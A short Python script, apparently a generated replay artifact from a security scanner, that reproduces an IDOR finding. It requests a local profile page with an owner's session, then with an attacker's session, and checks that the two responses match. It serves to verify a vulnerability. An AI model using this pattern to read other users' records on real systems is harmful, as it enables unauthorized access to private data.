#!/usr/bin/env python3
# Sentinel Replay Artifact
# Finding: f-ffc952c20b8f8c4b
# Vulnerability: idor
# Principals: p-owner123 -> p-attk123

import httpx
import hashlib
import base64
import sys

def main():
    target_url = 'http://localhost:8081/profile?user=123'
    method = 'GET'

    # Principal p-owner123
    client_p_owner123 = httpx.Client(verify=False, follow_redirects=True)
    client_p_owner123.cookies.update({'session_id': 'sess_owner', 'csrf_token': 'csrf_owner'})

    # Principal p-attk123
    client_p_attk123 = httpx.Client(verify=False, follow_redirects=True)
    client_p_attk123.cookies.update({'session_id': 'sess_attacker', 'csrf_token': 'csrf_attacker'})

    base_content = base64.b64decode(None) if None else None
    base_headers = {}
    base_req = client_p_owner123.build_request(method, target_url, headers=base_headers, content=base_content)
    print('[*] Simulating baseline execution...')
    base_resp = client_p_owner123.send(base_req)

    mut_content = base64.b64decode(None) if None else None
    mut_headers = {}
    mut_req = client_p_attk123.build_request(method, target_url, headers=mut_headers, content=mut_content)
    print('[*] Simulating mutation execution...')
    mut_resp = client_p_attk123.send(mut_req)

    print('[+] Response bodies extracted. Attempting to verify exact IDOR reproduction...')
    assert hashlib.sha256(base_resp.content).hexdigest() == hashlib.sha256(mut_resp.content).hexdigest(), 'Response contents do not match (IDOR failed)'
    print('IDOR reproduced successfully.')

if __name__ == '__main__':
    main()